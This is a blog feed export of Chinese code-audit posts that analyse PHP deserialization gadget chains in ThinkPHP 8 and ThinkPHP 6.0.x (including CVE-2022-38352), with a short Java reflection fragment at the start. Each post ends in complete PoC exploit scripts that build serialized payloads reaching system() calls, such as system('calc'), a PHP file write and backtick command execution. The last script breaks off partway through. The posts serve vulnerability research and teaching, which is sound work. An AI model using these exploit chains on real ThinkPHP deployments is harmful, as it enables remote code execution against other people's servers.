alt="img"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>说白了反射也就是先获取类，并进行实例化对象，然后获取类里面的属性，调用类里面的方法。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Java安全可以从反序列化说起，而反序列化可以从反射说起。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Java反射机制&lt;/strong&gt;：对于任意一个类都能知道这个类的所有属性和方法，对于任意一个对象，都能调用它的任意方法。这种动态获取信息以及动态调用方法的功能称为反射机制。&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP8反序列化利用链分析</title>
    <link href="http://example.com/2024/07/16/ThinkPHP8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/07/16/ThinkPHP8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2024-07-16T05:24:35.000Z</published>
    <updated>2024-07-16T06:51:39.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>配置环境参照官方文档：[ThinkPHP8官方手册][<a href="https://doc.thinkphp.cn/v8_0/preface.html]">https://doc.thinkphp.cn/v8_0/preface.html]</a></p><p>注意PHP版本在PHP8以上</p><p>下载好源码后更新composer，这里我用的是ThinkPHP8.0.0</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161329504.png" alt="img"></p><p>app\controller\Index.php添加反序列化入口</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161334277.png" alt="img"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>反序列化入口一般是destruct或wakeup方法，而wakeup一般用于对象初始化，大多选择destruct方法作为反序列化起点</p><p>我们先来全局搜索destruct方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161340430.png" alt="img"></p><p>可以看到只有两个可选，先看Connection类</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161341050.png" alt="img"></p><p>这里的destruct方法只是用来关闭数据库连接，并且Connection类实现了ConnectionInterface接口，destruct方法调用的是接口中的方法，再看其子类</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161345992.png" alt="img"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161346266.png" alt="img"></p><p>两个子类的close方法都用于赋值，不适合作为反序列化链的起点，再看ResourceRegister类</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161348269.png" alt="img"></p><p>$registered可控，跟进register方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161353261.png" alt="img"></p><p>$resource是可控的，那这里就可以利用$resource方法触发call方法，但是getRule方法是无参，没有办法控制call方法中的$args参数</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161357071.png" alt="img"></p><p>再看parseGroupRule方法，getRule方法的返回值可控，这里的option、last也是可控的，那么就可以利用字符串拼接触发toString方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161406789.png" alt="img"></p><p>再找可利用的toString方法，这里选择Conversion类的toString方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161412754.png" alt="img"></p><p>跟进toJson方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161413344.png" alt="img"></p><p>继续跟进toArray方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161414247.png" alt="img"></p><p>跟进appendAttrToArray方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161424169.png" alt="img"></p><p>最后来到getRelationWith方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161431091.png" alt="img"></p><p>这里可以通过$relation-&gt;visible($visible[$key])触发call方法，再利用Validate类的匿名函数执行call_user_func_array</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161440878.png" alt="img"></p><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">route</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">ResourceRegister</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">resource</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$resource</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;resource = <span class="variable">$resource</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RuleGroup</span> <span class="keyword">extends</span> <span class="title">Rule</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$rule</span>, <span class="variable">$router</span>, <span class="variable">$option</span></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$rule</span>, <span class="variable">$router</span>, <span class="variable">$option</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Resource</span> <span class="keyword">extends</span> <span class="title">RuleGroup</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$rule</span>, <span class="variable">$router</span>, <span class="variable">$option</span></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$rule</span>, <span class="variable">$router</span>, <span class="variable">$option</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Rule</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$rest</span> = [<span class="string">&#x27;key&#x27;</span> =&gt; [<span class="number">1</span> =&gt; <span class="string">&#x27;&lt;id&gt;&#x27;</span>]];</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;name&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$rule</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$router</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$option</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$rule</span>, <span class="variable">$router</span>, <span class="variable">$option</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;rule = <span class="variable">$rule</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;router = <span class="variable">$router</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;option = [<span class="string">&#x27;var&#x27;</span> =&gt; [<span class="string">&#x27;nivia&#x27;</span> =&gt; <span class="variable">$option</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Route</span>&#123;&#125;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">relation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [<span class="string">&#x27;Nivia&#x27;</span> =&gt; <span class="string">&quot;1.2&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$visible</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$visible</span>, <span class="variable">$call</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;visible = [<span class="number">1</span> =&gt; <span class="variable">$visible</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;relation = [<span class="string">&#x27;1&#x27;</span> =&gt; <span class="variable">$call</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Validate</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$type</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;type = [<span class="string">&#x27;visible&#x27;</span> =&gt; <span class="string">&quot;system&quot;</span>];<span class="comment">//function</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$visible</span>, <span class="variable">$call</span></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$visible</span>, <span class="variable">$call</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">VarDumper</span>\<span class="title class_">Caster</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">VarDumper</span>\<span class="title class_">Cloner</span>\<span class="title class_">Stub</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ConstStub</span> <span class="keyword">extends</span> <span class="title">Stub</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">VarDumper</span>\<span class="title class_">Cloner</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Stub</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">value</span> = &quot;<span class="title class_">calc</span>&quot;; <span class="comment">//cmd</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">call</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">Validate</span>;</span><br><span class="line">    <span class="variable">$option</span> = <span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="keyword">new</span> <span class="title class_">Symfony\Component\VarDumper\Caster\ConstStub</span>, <span class="variable">$call</span>);</span><br><span class="line">    <span class="variable">$router</span> = <span class="keyword">new</span> think\Route;</span><br><span class="line">    <span class="variable">$resource</span> = <span class="keyword">new</span> think\route\<span class="title function_ invoke__">Resource</span>(<span class="string">&quot;abc.nivia&quot;</span>, <span class="variable">$router</span> , <span class="variable">$option</span>);</span><br><span class="line">    <span class="variable">$resourceRegister</span> = <span class="keyword">new</span> think\route\<span class="title function_ invoke__">ResourceRegister</span>(<span class="variable">$resource</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$resourceRegister</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202407161442184.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;配置环境参照官方文档：[ThinkPHP8官方手册][&lt;a href=&quot;https://doc.thinkphp.cn/v8</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP6.0.13反序列化(CVE-2022-38352)分析</title>
    <link href="http://example.com/2024/07/10/ThinkPHP6-0-13%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2022-38352-%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/07/10/ThinkPHP6-0-13%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2022-38352-%E5%88%86%E6%9E%90/</id>
    <published>2024-07-10T08:15:56.000Z</published>
    <updated>2024-08-22T10:24:43.828Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>composer安装tp6.0.13</p><pre><code>composer create-project topthink/think=6.0.13 tp6013</code></pre><p>app\controller\Index.php添加反序列化利用点</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822732.png" alt="image-20240710163053480"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>全局搜索_destruct，跟进vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php的save方法，$this-&gt;autosave可控</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822106.png" alt="image-20240710163739513"></p><p>由于其是抽象类，所以跟进其子类\src\Storage\Psr6Cache的save方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822678.png" alt="image-20240710163700241"></p><p>$this-&gt;pool可控，所以可以调用任意类的_call方法，这里调用的是think\log\Channel类的call方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822200.png" alt="image-20240710164308899">****</p><p>跟进log方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822065.png" alt="image-20240710164424955"></p><p>继续跟进record方法，当$this-&gt;lazy为false时就能调用save方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822279.png" alt="image-20240710164623490"></p><p>继续跟进save方法，$this-&gt;logger可控，可以调用任意类的save方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822340.png" alt="image-20240710164807192"></p><p>跟进think\log\driver\Socket类中的save方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823407.png" alt="image-20240710165520884"></p><p>首先需要绕过第一个判断，使check()方法返回true，跟进check方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823609.png" alt="image-20240710165853869"></p><p>那么让$allowClientIds为空，$this-&gt;config[‘force_client_ids’]为true即可使check方法返回true</p><p>回到save方法，$this-&gt;config[‘debug’]为true进入分支</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823312.png" alt="image-20240710170219974"></p><p>给$this-&gt;app赋值为think\App类，而App类没有exists方法，会调用其父类Container的exists方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823383.png" alt="image-20240710171035012"></p><p>跟进getAlias方法，发现其功能为根据别名获取真实类名，因为传入的$abstract为request，所以这个方法就会返回think\Request</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823095.png" alt="image-20240710171244927"></p><p>回到exists方法，我们想要让其返回true只需要给$this-&gt;instances赋值为[‘think\Request’&#x3D;&gt;new Request()]即可</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221823281.png" alt="image-20240710172146869"></p><p>再回到save方法，接下来调用Request类的url方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824363.png" alt="image-20240710172506803"></p><p>跟进url方法，这里会将我们可控的$this-&gt;url赋值给$url，并且由于传入的complete为true，会调用domain方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824665.png" alt="image-20240710172708415"></p><p>跟进domain方法，返回协议:&#x2F;&#x2F;端口，然后在url方法中会拼接url</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824333.png" alt="image-20240710172944036"></p><p>url方法的返回结果会赋值给$currentUri，然后进第三个if</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824923.png" alt="image-20240710180036659"></p><p>给$this-&gt;config[‘format_head’]赋值，然后调用Container类的invoke方法</p><p>跟进invoke方法，执行第三个return语句</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824388.png" alt="image-20240710180426215"></p><p>跟进invokeMethod方法，如果我们传入的是数组，就将键赋值给class，值赋给method</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824527.png" alt="image-20240710180619986"></p><p>下面的三行代码实现反射执行任意类的任意方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824161.png" alt="image-20240710180802255"></p><p>其中$class和$method是我们控制的$this-&gt;config[‘format_head’]中的内容，$vars是$currentUri中的内容，拼接时传入的$this-&gt;url可控</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824815.png" alt="image-20240710181413961"></p><p>下面我们就要寻找一个可以利用的类和方法，这里找的是think\view\Php类的display方法，跟进这个方法可以看到很明显的RCE</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221824547.png" alt="image-20240710181602709"></p><p>再回头看看$currentUri，前半部分是http:&#x2F;&#x2F;，后半部分是$this-&gt;url，那么我们只需要让$this-&gt;url为我们想要执行的代码即可</p><h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h1><pre><code class="php">&lt;?phpnamespace League\Flysystem\Cached\Storage&#123;    class Psr6Cache&#123;        private $pool;        protected $autosave = false;        public function __construct($exp)&#123;            $this-&gt;pool = $exp;        &#125;    &#125;&#125;namespace think\log&#123;    class Channel&#123;        protected $logger;        protected $lazy = true;        public function __construct($exp)&#123;            $this-&gt;logger = $exp;            $this-&gt;lazy = false;        &#125;    &#125;&#125;namespace think&#123;    class Request&#123;        protected $url;        public function __construct()&#123;            $this-&gt;url = &#39;&lt;?php system(\&#39;calc\&#39;); exit(); ?&gt;&#39;;        &#125;    &#125;    class App&#123;        protected $instances = [];        public function __construct()&#123;            $this-&gt;instances = [&#39;think\Request&#39;=&gt;new Request()];        &#125;    &#125;&#125;namespace think\view\driver&#123;    class Php&#123;&#125;&#125;namespace think\log\driver&#123;    class Socket&#123;        protected $config = [];        protected $app;        public function __construct()&#123;            $this-&gt;config = [                &#39;debug&#39;=&gt;true,                &#39;force_client_ids&#39; =&gt; 1,                &#39;allow_client_ids&#39; =&gt; &#39;&#39;,                &#39;format_head&#39; =&gt; [new \think\view\driver\Php,&#39;display&#39;],            ];            $this-&gt;app = new \think\App();        &#125;    &#125;&#125;namespace&#123;    $c = new think\log\driver\Socket();    $b = new think\log\Channel($c);    $a = new League\Flysystem\Cached\Storage\Psr6Cache($b);    echo urlencode(base64_encode(serialize($a)));&#125;</code></pre><p><img src="/../images/image-20240710182029406.png" alt="image-20240710182029406"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;composer安装tp6.0.13&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;composer create-project topt</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP6.0.X反序列化利用链</title>
    <link href="http://example.com/2024/07/10/ThinkPHP6-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <id>http://example.com/2024/07/10/ThinkPHP6-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/</id>
    <published>2024-07-10T01:49:16.000Z</published>
    <updated>2024-08-22T10:28:20.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>首先下载tp6.0.3</p><pre><code>composer create-project topthink/think=6.0.3 tp603</code></pre><p>然后更新版本</p><pre><code>composer update</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825775.png" alt="image-20240710095443189"></p><p>app&#x2F;controller&#x2F;Index.php设置反序列化可控点</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825872.png" alt="image-20240710095655616"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="利用链1"><a href="#利用链1" class="headerlink" title="利用链1"></a>利用链1</h2><p>全局搜索_destruct,定位到src\Model.php</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825951.png" alt="image-20240710100016061"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825284.png" alt="image-20240710100037629"></p><p>$this-&gt;lazySave可控，直接跟进save方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825133.png" alt="image-20240710100556355"></p><p>继续跟进updateData方法，发现其调用了检查字段的checkAllowFields方法，跟进</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825834.png" alt="image-20240710100832177"></p><p>checkAllowFields方法又调用了db方法，继续跟进</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825297.png" alt="image-20240710101033350"></p><p>这里的$this-&gt;table和$this-&gt;suffix都是可控的，可以利用字符串拼接来触发toString方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825318.png" alt="image-20240710101254556"></p><p>我们再来全局搜索toString方法，跟进\src\model\concern\Conversion.php中的toJson方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825038.png" alt="image-20240710103400986"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825027.png" alt="image-20240710103512162"></p><p>其调用了toArray方法，跟进</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825068.png" alt="image-20240710103844186">继续跟进getAttr方法，发现在try中调用了getData方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221825230.png" alt="image-20240710104115113"></p><p>跟进getData方法，其又调用了getRealFieldName方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221826696.png" alt="image-20240710104226388"></p><p>跟进getRealFieldName，当$this-&gt;strict为true时会返回$name</p><p><img src="/../images/image-20240710104447027.png" alt="image-20240710104447027"></p><p>回到getData方法，$fieldName得到$name返回值后会进入由array_key_exists()进行判断然后返回$this-&gt;data&#x3D;[$fieldName]</p><p><img src="/../images/image-20240710105329488.png" alt="image-20240710105329488"></p><p>再回到getAttr，最终return会调用getValue方法</p><p><img src="/../images/image-20240710105426998.png" alt="image-20240710105426998"></p><p>跟进getValue方法，发现有$value   &#x3D; $closure($value, $this-&gt;data)，这里的$closure、$value和$this-&gt;data都是可控的，那么就可以使得$closure作为函数名、$value和$this-&gt;data作为参数实现任意函数执行</p><p><img src="/../images/image-20240710105649242.png" alt="image-20240710105649242"></p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="php">&lt;?phpnamespace think;abstract class Model&#123;    use model\concern\Attribute;    use model\concern\ModelEvent;    protected $table;    private $force;    private $exists;    private $lazySave;    private $data = [];    function __construct($obj)&#123;        $this-&gt;table = $obj;        $this-&gt;force = true;        $this-&gt;exists = true;        $this-&gt;lazySave = true;        $this-&gt;data = [&quot;p0l1st&quot; =&gt; &quot;calc&quot;];    &#125;&#125;namespace think\model\concern;trait ModelEvent&#123;    protected $withEvent = true;    protected $visible = [&quot;p0l1st&quot; =&gt; &quot;1&quot;];&#125;trait Attribute&#123;    private $withAttr = [&quot;p0l1st&quot; =&gt; &quot;system&quot;];&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;    function __construct($obj = &#39;&#39;)&#123;        parent::__construct($obj);    &#125;&#125;echo urlencode(serialize(new Pivot(new Pivot())));?&gt;</code></pre><p><img src="/../images/image-20240710110533476.png" alt="image-20240710110533476"></p><h2 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h2><p>继续全局搜索_destruct，跟进vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php</p><p><img src="/../images/image-20240710111255038.png" alt="image-20240710111255038"></p><p>$this-&gt;autosave可控，但是AbstractCache是一个抽象类，本身的sava()方法不可用，所以在其继承类中寻找可利用的save方法</p><p>跟进vendor\topthink\framework\src\think\filesystem\CacheStore.php中的save方法</p><p><img src="/../images/image-20240710112522232.png" alt="image-20240710112522232"></p><p>发现其调用了getForStorage方法，继续跟进</p><p><img src="/../images/image-20240710113246417.png" alt="image-20240710113246417"></p><p>再跟进cleanContents方法，其调用array_flip()对数组进行反转来交换数组中的键值，然后调用array_intersect_key使用键名比较计算数组的交集</p><p><img src="/../images/image-20240710114039168.png" alt="image-20240710114039168"></p><p>再回到Cachestore类，这里的$this-&gt;store也是可控的，那我们就可以调用任意类的set方法，如果这个类不存在set方法可能触发call方法</p><p><img src="/../images/image-20240710114832276.png" alt="image-20240710114832276"></p><h3 id="PoC1"><a href="#PoC1" class="headerlink" title="PoC1"></a>PoC1</h3><p>直接找一个可以利用的set方法</p><p>跟进src&#x2F;think&#x2F;cache&#x2F;driver&#x2F;File.php中的set方法，发现有一个serialize方法</p><p><img src="/../images/image-20240710115743276.png" alt="image-20240710115743276"></p><p>跟进serialize方法，发现$this-&gt;options参数是可控的，那我们就可以利用它执行任意函数</p><p><img src="/../images/image-20240710115904861.png" alt="image-20240710115904861"></p><p>再看$data,$data来源于$value，而$value来源于$contents，$contents来源于getForStorage，需要经过json_encode方法处理，所以需要使json_encode后的数据被当作代码执行</p><p>Linux中可以用这样的形式</p><p><img src="/../images/image-20240710121445539.png" alt="image-20240710121445539"></p><pre><code class="php">&lt;?php namespace League\Flysystem\Cached\Storage &#123;    abstract class AbstractCache &#123;        protected $autosave = false;        protected $complete = &quot;`id`&quot;;        // protected $complete = &quot;\&quot;&amp;whoami&amp;&quot; ;        // 在Windows环境中反引号无效，用&amp;替代    &#125;&#125;namespace think\filesystem &#123;    use League\Flysystem\Cached\Storage\AbstractCache;    class 